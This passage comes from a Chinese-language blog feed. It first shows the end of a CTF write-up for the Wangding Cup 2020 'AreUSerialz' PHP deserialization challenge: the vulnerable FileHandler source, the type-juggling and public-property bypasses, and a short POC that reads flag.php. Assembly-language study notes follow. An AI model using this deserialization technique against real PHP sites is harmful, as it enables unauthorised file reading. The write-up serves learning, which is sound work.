class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;<span class="comment">//如果op=1，写出文件</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;<span class="comment">//如果op=2,读入文件</span></span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);<span class="comment">//否则提示错误</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;<span class="comment">//若当前filename有值，读取该filename</span></span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)<span class="comment">//如果op的大小为2，且类型为string,将其转化为1</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();<span class="comment">//执行process()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;<span class="comment">//对反序列化字段%00有检测</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有一个<code>include(&quot;flag.php&quot;);</code>，我们猜测flag应该就是中<code>flag.php</code>中</p>
<p>可以发现，最后一段<code>unserialize()</code>里的参数是来源于<code>Get请求中的str参数</code>，那么我们可以发送<code>GET请求</code>来执行反序列化操作。</p>
<p>有了<code>unserialize()</code>函数，我们还需要一个有可利用的魔法函数的Class。很明显，我们可以看到上面有一个<code>class FileHandler</code>，通过观察，他有<code>_destruct()</code>方法，且方法中执行了<code>process()</code>函数。再分析<code>process()</code>函数可以发现它在对<code>op</code>的值进行判断。若op=2,我们就可以读取我们想要的文件了！</p>
<p>因为在<code>_destruct()</code>中，判断<code>op</code>是用的<code>===</code>，即要求变量类型和数值都得一样，所以我们可以把<code>op</code>写成<code>op=2</code>，这样因为不是String类型，就不会被检测了，最终可以绕过该检测。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)<span class="comment">//如果op的大小为2，且类型为string,将其转化为1</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>另外<code>is_valid()</code>对反序列化字段%00有检测，如果我们用<code>protected</code>类型的<code>attribute</code>写POC是无法绕过的，</p>
<blockquote>
<p>php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可</p>
</blockquote>
<p>所以我们可以把<code>attribute</code>都改成<code>public</code> </p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>);</span><br></pre></td></tr></table></figure>

<p>生成出来的序列化数据用get形式发给网址</p>
<p><img src="/image/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-Write-up/image-20210715142703979.png" alt="image-20210715142703979"></p>
<p>可以看到<code>result</code>已经有了，右键查看源代码即可得到<code>flag</code></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>之前一直没搞清楚 <code>__construct()</code>的触发机制，<code>__construct()</code>在执行<code>unserialize()</code>时是不会被触发的。</p>
<p>主要是两个坑点：</p>
<ul>
<li><p><code>is_valid()</code>导致<code>%00</code>无法写入 -&gt; <strong>php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可</strong></p>
</li>
<li><p><code>php</code>的<code>===</code>和<code>==</code>的区别：</p>
<blockquote>
<ul>
<li>用<strong>三个等号</strong>时，除了两<strong>个</strong>变量的值相同外，还必须这两<strong>个</strong>变量的类型相同，才能输出true，否则输出false</li>
</ul>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Write-up</tag>
        <tag>PHP Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编个人学习笔记</title>
    <url>/2021/09/06/%E6%B1%87%E7%BC%96%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>汇编是很多课程的重要基础，正好最近在学习操作系统，发现在操作系统的学习中，汇编也表现得极为重要，同样在逆向的学习中，不会汇编基本等于与逆向无门了。</p>
<p>此篇是个人笔记，供自己复习和做笔记。</p>
<p>参考资料：<strong>《汇编语言(第3版) 》王爽著</strong></p>
<span id="more"></span>

<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="进制转换和数据宽度"><a href="#进制转换和数据宽度" class="headerlink" title="进制转换和数据宽度"></a>进制转换和数据宽度</h2><p><strong>16进制</strong>：</p>
<p>0123456789ABCDEF</p>
<p>10 11 12 13 14 15 16 17 18 19 20 21….</p>
<p><strong>One single hexadecimal digit = 4 bit</strong></p>
<p><strong>8进制</strong>：</p>
<p>01234567</p>
<p>10 11 12 13 14 15</p>
<p><strong>One single Octal digit = 3 bit</strong></p>
<p><strong>数据宽度：</strong></p>
<p>1 Byte = 8 Bit</p>
<p>1 Word = 2 Bytes =》四个十六进制数字为一个word</p>
<p>Double Word = 2 Word</p>
<p><strong>需要记住的一些数字</strong>：</p>
<p><code>1024=2^10</code></p>
<p>1KB=1024B(Byte)</p>
<p>1MB=1024KB</p>
<p>1GB=1024MB</p>
<p>1TB=1024GB</p>
<h2 id="CPU对存储器的读写"><a href="#CPU对存储器的读写" class="headerlink" title="CPU对存储器的读写"></a>CPU对存储器的读写</h2><p>比如CPU要从内存地址3中读写数据：</p>
<p><strong>读</strong></p>
<ul>
<li>CPU通过<strong>地址总线</strong>将地址信息3发出。</li>
<li>CPU通过<strong>控制总线</strong>发出<strong>读</strong>内存的命令，选中存储器的芯片，通知它我要读取数据。</li>
<li>存储器将地址3中的数据通过<strong>数据线</strong>送入CPU</li>
</ul>
<h2 id="地址总线"><a href="#地址总线" class="headerlink" title="地址总线"></a>地址总线</h2><p>地址总线是一根导线，我们知道一根导线传输数据的时候只有两种稳定状态 - 要么是<strong>高电平</strong>要么是<strong>低电平</strong> - 二进制表示就是<strong>0和1</strong>。</p>
<p>CPU用地址总线来寻址，有多少不同的信息，CPU就可以对多少个<strong>存储单元</strong>(一个存储单元里有1byte的信息)寻址</p>
<p>所以如果现一CPU有10根导线，那么它可以发出10 bit的二进制数，而10bit的二进制数可以表示2^10=1024个不同的数据，也就是可以寻找2^10=1024个<strong>内存单元</strong>。</p>
<p><img src="/image/%E6%B1%87%E7%BC%96%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210906135049439.png" alt="image-20210906135049439"></p>
<p>上图演示的是将地址<strong>1011</strong>通过地址总线发出</p>
<h2 id="数据总线"><a href="#数据总线" class="headerlink" title="数据总线"></a>数据总线</h2><p><strong>CPU和其他器件之间的数据传送是通过数据总线进行的。数据总线的宽度决定了CPU和外界数据传送的速度。</strong></p>
<p>一个数据总线可以传送一个bit（位）的数据，<strong>8根数据总线可以传送一个byte的数据</strong></p>
<p>假设你有16根数据线，那么你一次性可以传输16bit的数据 - 所以你可以传输<strong>89D8</strong>H - 因为89D8是十六进制，一个十六进制数字为4bit，所以89D8刚好16bit. 如果数据线只有八根，意味着你只能传输8bit的数据，那么你只能分两次传送：先D8后89(从低位开始传)</p>
<p><img src="/image/%E6%B1%87%E7%BC%96%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210906140434026.png" alt="image-20210906140434026"></p>
<h2 id="控制总线"><a href="#控制总线" class="headerlink" title="控制总线"></a>控制总线</h2><p>CPU对外部器件的控制是通过控制总线来进行的。此处控制总线是一个总称，它有多少根控制总线，意味着CPU提供了对外部器件的多少种控制。所以控制总线的宽度决定了CPU对外部器件的控制能力。</p>
<p>比如读和写就分别为两条控制总线。</p>
<h2 id="课后习题-1-1"><a href="#课后习题-1-1" class="headerlink" title="课后习题 1.1"></a>课后习题 1.1</h2><p><img src="/image/%E6%B1%87%E7%BC%96%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210906140647234.png" alt="image-20210906140647234"></p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">(</span><span class="number">1</span><span class="punctuation">)</span> 该<span class="variable">CPU</span>的寻址能力为<span class="number">8</span><span class="variable">Kb</span>，换算成<span class="built_in">Byte</span>为<span class="number">8</span><span class="operator">*</span><span class="number">1024</span><span class="built_in">Byte</span>。 我们知道一个内存单元可以储存<span class="number">1</span>个<span class="built_in">Byte</span>，那么意味着该<span class="variable">CPU</span>可以寻址<span class="number">8</span><span class="operator">*</span><span class="number">1024</span><span class="operator">=</span><span class="number">2</span><span class="operator">^</span><span class="number">13</span>个内存单元。</span><br><span class="line"></span><br><span class="line">所以我们可以得出他有<span class="number">13</span>个地址总线，则宽度为<span class="number">13</span>。</span><br><span class="line"></span><br><span class="line"><span class="punctuation">(</span><span class="number">2</span><span class="punctuation">)</span> <span class="number">1</span><span class="variable">KB</span>的存储器有<span class="number">1024</span>个存储单元，因为一个存储单元存储<span class="number">1</span><span class="built_in">Byte</span>信息。存储单元的编号从<span class="number">0</span>到<span class="number">1023</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">(</span><span class="number">3</span><span class="punctuation">)</span> <span class="number">1</span><span class="variable">KB</span>的存储器可以存储<span class="number">10248</span><span class="operator">=</span><span class="number">2</span><span class="operator">^</span><span class="number">13</span> <span class="variable">bit</span><span class="operator">,</span> 和<span class="number">1024</span>个<span class="built_in">Byte</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">(</span><span class="number">4</span><span class="punctuation">)</span> <span class="number">1</span><span class="variable">GB</span><span class="operator">=</span><span class="number">2</span><span class="operator">^</span><span class="number">30</span> <span class="built_in">Byte</span><span class="operator">,</span> <span class="number">1</span><span class="variable">MB</span> <span class="operator">=</span> <span class="number">2</span><span class="operator">^</span><span class="number">20</span> <span class="built_in">Byte</span><span class="operator">,</span> <span class="number">1</span><span class="variable">KB</span><span class="operator">=</span> <span class="number">2</span><span class="operator">^</span><span class="number">10</span> <span class="built_in">Byte</span><span class="operator">.</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">(</span><span class="number">5</span><span class="punctuation">)</span> <span class="number">2</span><span class="operator">^</span><span class="number">16</span><span class="operator">*</span><span class="number">2</span><span class="operator">^</span><span class="punctuation">(</span><span class="operator">-</span><span class="number">10</span><span class="punctuation">)</span><span class="operator">=</span><span class="number">2</span><span class="operator">^</span><span class="number">6</span><span class="operator">,</span> <span class="number">2</span><span class="operator">^</span><span class="number">20</span><span class="operator">*</span><span class="number">2</span><span class="operator">^</span><span class="punctuation">(</span><span class="operator">-</span><span class="number">20</span><span class="punctuation">)</span><span class="operator">=</span><span class="number">1</span><span class="operator">,</span> <span class="number">2</span><span class="operator">^</span><span class="number">24</span><span class="operator">*</span><span class="number">2</span><span class="operator">^</span><span class="punctuation">(</span><span class="operator">-</span><span class="number">20</span><span class="punctuation">)</span><span class="operator">=</span><span class="number">2</span><span class="operator">^</span><span class="number">4</span><span class="operator">,</span><span class="number">2</span><span class="operator">^</span><span class="number">32</span><span class="operator">*</span><span class="number">2</span><span class="operator">^</span><span class="punctuation">(</span><span class="operator">-</span><span class="number">30</span><span class="punctuation">)</span><span class="operator">=</span><span class="number">2</span><span class="operator">^</span><span class="number">2</span><span class="operator">=</span><span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">(</span><span class="number">6</span><span class="punctuation">)</span> <span class="number">1</span><span class="variable">B</span><span class="operator">,</span><span class="number">1</span><span class="variable">B</span><span class="operator">,</span><span class="number">2</span><span class="variable">B</span><span class="operator">,</span><span class="number">2</span><span class="variable">B</span><span class="operator">,</span><span class="number">4</span><span class="variable">B</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">(</span><span class="number">7</span><span class="punctuation">)</span> </span><br><span class="line"></span><br><span class="line">要读的数据：<span class="number">1024</span><span class="operator">=</span><span class="number">2</span><span class="operator">^</span><span class="number">10</span> <span class="variable">byte</span><span class="operator">,</span> </span><br><span class="line"></span><br><span class="line">根据上面的问题，<span class="number">8086</span>一次可以读<span class="number">2</span> <span class="built_in">Byte</span>，那么要读<span class="number">2</span><span class="operator">^</span><span class="number">9</span><span class="operator">=</span><span class="number">512</span>次</span><br><span class="line"></span><br><span class="line"><span class="number">80386</span>一次可以读<span class="number">4</span> <span class="built_in">Byte</span><span class="operator">,</span>那么要读<span class="number">2</span><span class="operator">^</span><span class="number">8</span><span class="operator">=</span><span class="number">256</span>次</span><br><span class="line"></span><br><span class="line"><span class="punctuation">(</span><span class="number">8</span><span class="punctuation">)</span> 在存储器中，数据和程序以二进制形式存放</span><br></pre></td></tr></table></figure>

<h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><p>CPU由运算器、控制器、寄存器构成。</p>
<ul>
<li><strong>运算器</strong>进行<strong>信息处理</strong></li>
<li><strong>寄存器</strong>进行<strong>信息存储</strong></li>
<li><strong>控制器</strong>控制各种器件进行工作</li>
<li>内部总线连接各种器件，在它们之间进行数据的传送</li>
</ul>
<p><strong>16位寄存器：</strong></p>
<blockquote>
<p>AX</p>
<p>BX</p>
<p>CX</p>
<p>DX</p>
</blockquote>
<p><strong>8位寄存器：</strong>会被<strong>单独</strong>使用，比如AH溢出后，<strong>不会</strong>把溢出的位补到AX前面的高位（AH）去</p>
<blockquote>
<p>H表示high，L表示low</p>
<p>AH AL</p>
<p>BH BL</p>
<p>CH CL</p>
<p>DH DL</p>
</blockquote>
<h2 id="几条汇编指令"><a href="#几条汇编指令" class="headerlink" title="几条汇编指令"></a>几条汇编指令</h2><p>mov 寄存器，数据    <code>mov ax,2</code></p>
<p>mov 寄存器，寄存器    <code>mov ax,bx</code></p>
<p>mov 寄存器，内存单元    <code>mov ax,[0]</code></p>
<p>mov 内存单元，寄存器    <code>mov [0], ax</code></p>
<p>mov 段寄存器，寄存器    <code>mov ds,ax</code></p>
<p>mov 寄存器，段寄存器    <code>mov ax,ds</code></p>
<h2 id="课后习题2-1"><a href="#课后习题2-1" class="headerlink" title="课后习题2.1"></a>课后习题2.1</h2><p>（1）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,62627	AX=F4A3H</span><br><span class="line">mov ah,31H		AX=31A3H</span><br><span class="line">mov al,23H		AX=3123H</span><br><span class="line">add ax,ax		AX=6246H</span><br><span class="line">mov bx,826CH	BX=826CH</span><br><span class="line">mov cx,ax		CX=6246H</span><br><span class="line">mov ax,bx		AX=826CH</span><br><span class="line">add ax,bx		AX=04D8H</span><br><span class="line">mov al,bh		AX=0482H</span><br><span class="line">mov ah,bl		AX=6C82H</span><br><span class="line">add ah,ah		AX=D882H</span><br><span class="line">add al,6		AX=D888H</span><br><span class="line">add al,al		AX=D810H</span><br><span class="line">mov ax,cx		AX=6246H</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>（2）用目前学过的汇编指令，最多使用四条指令，计算2的4次方</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,0002</span><br><span class="line">add ax,ax</span><br><span class="line">add ax,ax</span><br><span class="line">add ax,ax</span><br></pre></td></tr></table></figure>

<h2 id="物理地址、段和偏移地址"><a href="#物理地址、段和偏移地址" class="headerlink" title="物理地址、段和偏移地址"></a>物理地址、段和偏移地址</h2><p><strong>8086中，地址总线有20根，但是数据总线只有16根。所以需要用两个16进制表示20进制的地址。段地址（16位）×16＋偏移地址（16位）=地址（20位）</strong></p>
<p>地址加法器处理后可以得到物理地址</p>
<p><code>物理地址=段地址*16+偏移地址</code></p>
<blockquote>
<p><code>短地址*16</code>表示十六进制左移1位，也就是二进制左移4位</p>
<p>比如十进制20要左移一位：20*10=200</p>
<p>二进制10B左移一位：100B转换成十进制2*2=4</p>
<p>一个数据的二进制形式左移1位，相当于该数据×2</p>
<p>一个数据的二进制形式左移N位，相当于该数据×2^N</p>
</blockquote>
<p><img src="/image/%E6%B1%87%E7%BC%96%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210907170044257.png" alt="image-20210907170044257"></p>
<p>偏移地址16位，最多可以寻址64KB(2^16bit个内存单元，一个内存单元8bit，所以2^16*2^3=2^19bit=2^6KB=64KB)</p>
<h2 id="课后习题2-2"><a href="#课后习题2-2" class="headerlink" title="课后习题2.2"></a>课后习题2.2</h2><figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line">（<span class="number">1</span>）给定段地址位<span class="number">0001</span><span class="variable">H</span>，仅通过变化偏移地址寻址，<span class="variable">CPU</span>的寻址范围为？</span><br><span class="line"></span><br><span class="line">最小：<span class="number">0001</span><span class="variable">H</span><span class="operator">*</span><span class="number">16</span><span class="operator">+</span><span class="number">0000</span><span class="variable">H</span><span class="operator">=</span><span class="number">0010</span><span class="variable">H</span></span><br><span class="line"></span><br><span class="line">最大：<span class="number">0001</span><span class="variable">H</span><span class="operator">*</span><span class="number">16</span><span class="operator">+</span><span class="variable">FFFFH</span><span class="operator">=</span><span class="number">1</span> <span class="number">000</span><span class="variable">FH</span></span><br><span class="line"></span><br><span class="line"><span class="operator">**</span>所以寻址范围为<span class="number">0001</span><span class="variable">H</span><span class="operator">~</span><span class="number">1000</span><span class="variable">FH</span><span class="operator">**</span></span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）有一段数据存放在内存 <span class="number">20000</span><span class="variable">H</span>单元中，先给定段地址为<span class="variable">SA</span>，想用偏移地址寻到此单元，则<span class="variable">SA</span>应该满足的条件是：</span><br><span class="line"></span><br><span class="line">最小为<span class="operator">:</span></span><br><span class="line"></span><br><span class="line">当偏移地址为最大<span class="variable">FFFFH</span>时，<span class="number">20000</span><span class="variable">H</span><span class="operator">-</span><span class="variable">FFFFH</span><span class="operator">=</span><span class="number">1</span> <span class="number">0001</span><span class="variable">H</span></span><br><span class="line"></span><br><span class="line"><span class="variable">SA</span>必须为<span class="number">16</span>的倍数<span class="operator">,</span>所以<span class="variable">SA</span>左移后的最后一位必须是<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="number">0010</span><span class="variable">H</span><span class="operator">-</span>》<span class="number">1001</span><span class="variable">H</span></span><br><span class="line"></span><br><span class="line"><span class="operator">**</span>所以最小为<span class="number">1001</span><span class="variable">H</span><span class="operator">**</span></span><br><span class="line"></span><br><span class="line">最大为<span class="operator">:</span></span><br><span class="line"></span><br><span class="line"><span class="number">20000</span><span class="variable">H</span><span class="operator">-&gt;</span><span class="number">2000</span><span class="variable">H</span></span><br><span class="line"></span><br><span class="line"><span class="operator">**</span>所以最大为<span class="number">2000</span><span class="variable">H</span><span class="operator">**</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h2><p>8086CPU有四个段寄存器：</p>
<p><strong>CS（code segment）, DS(data segment), SS(stack segment), ES(extra segment)</strong></p>
<p>CS和IP（instructor pointer指令指针寄存器）是最关键寄存器 -》指向了CPU当前要读的地址</p>
<p>8086CPU工作过程：</p>
<ul>
<li>从CS:IP指向的内存单元获取指令</li>
<li>IP=IP+所读取指令的长度，从而指向下一条按指令</li>
<li>执行指令，回到第一步，重复这个过程</li>
</ul>
<p>修改CS IP的指令不用<code>mov</code>指令（因为不支持把数据直接送入段寄存器）而是用<code>jmp</code></p>
<ul>
<li>同时修改CS 和 IP：<ul>
<li>jmp CS: IP</li>
<li>如 jmp 2AE3:3<ul>
<li>CS=2AE3H, IP=0003H -&gt; 2AE30+0003=2AE33H</li>
</ul>
</li>
<li>jmp 3:0B16<ul>
<li>CS=0003H, IP =0B16H -&gt; 0030+0B16=0B46H</li>
</ul>
</li>
</ul>
</li>
<li>只修改IP，当前CS不变<ul>
<li>jmp IP</li>
</ul>
</li>
</ul>
<h2 id="课后习题-2-3"><a href="#课后习题-2-3" class="headerlink" title="课后习题 2.3"></a>课后习题 2.3</h2><p>下列3条指令执行后，CPU几次修改IP？都是在什么时候？最后IP中的值是多少？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,bx#读取指令后IP被修改</span><br><span class="line"></span><br><span class="line">sub ax,ax#读取指令后IP被修改</span><br><span class="line"></span><br><span class="line">jmp ax #读取指令后IP被修改，然后IP又被修改为ax</span><br><span class="line"></span><br><span class="line"># cpu修改了4次IP，因为每执行完一个指令，IP都会递增1， -》 在jmp ax处，最后IP被修改为了0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/image/%E6%B1%87%E7%BC%96%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210909145406877.png" alt="image-20210909145406877"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount c: d:\asm</span><br><span class="line">c:\</span><br><span class="line">debug</span><br></pre></td></tr></table></figure>

<h1 id="寄存器（内存访问）"><a href="#寄存器（内存访问）" class="headerlink" title="寄存器（内存访问）"></a>寄存器（内存访问）</h1><h2 id="内存中字的存储"><a href="#内存中字的存储" class="headerlink" title="内存中字的存储"></a>内存中字的存储</h2><p>一个内存单元是一个byte（字节）</p>
<p>一个字单元由两个内存单元组成，也就是两个字节（bytes）=1个word</p>
<p>0地址: 2E</p>
<p>1地址：3C</p>
<p>问0地址单元存储的**字型(word)**数据是：3C2EH</p>
<p>0地址单元存储的**字节型(byte)**数据是：2EH</p>
<h2 id="DS和-address"><a href="#DS和-address" class="headerlink" title="DS和[address]"></a>DS和[address]</h2><p>要给ds寄存器赋值，必须要先把值赋给通用寄存器，然后通用寄存器再赋值给ds寄存器。数据不能直接送进段寄存器。</p>
<p><code>[]</code>是对数据段操作</p>
<p><strong>例如：从10000H中读取数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov bx,1000H#为什么是1000H，因为1000H段地址*16=左移一位，然后加上偏移地址就可以得到最后的真实地址</span><br><span class="line">mov ds, bx</span><br><span class="line">mov al,[0]#10000+0=10000H</span><br></pre></td></tr></table></figure>

<h2 id="字的传送"><a href="#字的传送" class="headerlink" title="字的传送"></a>字的传送</h2><p><img src="/image/%E6%B1%87%E7%BC%96%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210909155520090.png" alt="image-20210909155520090"></p>
<p>ax是一个<strong>word的长度</strong>，所以这里mov ax,[0]其实取的是1123而不是23</p>
<p>11是高位，22是低位，我们取了连续的<strong>两个内存单元而不是一个内存单元</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub ax,1CH#ax=ax-1CH</span><br></pre></td></tr></table></figure>

<h2 id="mov-add-sub指令"><a href="#mov-add-sub指令" class="headerlink" title="mov, add, sub指令"></a>mov, add, sub指令</h2><p>mov ds, ax和mov ax,ds都可以实现。</p>
<p>段寄存器也可以给通用寄存器传数据</p>
<h2 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h2><p>我们用123B0H~123B9H这段空间来存放数据：</p>
<ul>
<li>段地址：123BH</li>
<li>长度：10字节（一个地址指向一个内存单元，一个内存单元等于一个字节，0~9有10个内存单元，所以有10个字节）</li>
